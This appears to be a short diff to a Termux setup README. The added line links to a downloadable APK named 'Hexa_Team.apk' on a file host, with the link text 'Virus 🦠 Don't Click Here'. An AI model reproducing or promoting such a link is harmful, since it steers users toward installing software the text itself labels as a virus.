@@ -41,3 +41,4 @@ pkg install git -y
 ```
 
 
+<a href="https://apkadmin.com/segtnq72epm4/Hexa_Team.apk.html" target=_blank>Virus 🦠 Don't Click Here</a>
